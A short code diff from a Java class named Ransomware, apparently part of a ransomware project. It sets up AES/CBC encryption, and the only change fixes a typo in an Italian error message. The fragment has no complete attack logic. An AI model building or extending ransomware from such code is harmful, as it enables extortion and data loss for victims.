@@ -166,7 +166,7 @@ public class Ransomware {
 			cipher = Cipher.getInstance( "AES/CBC/PKCS5Padding" );
 			cipher.init( Cipher.ENCRYPT_MODE, secretKey );
 		} catch ( Exception e ) {
-			System.out.println( "Errore creazioen cipher" );
+			System.out.println( "Errore creazione cipher" );
 			System.exit( -2 );
 		}
 
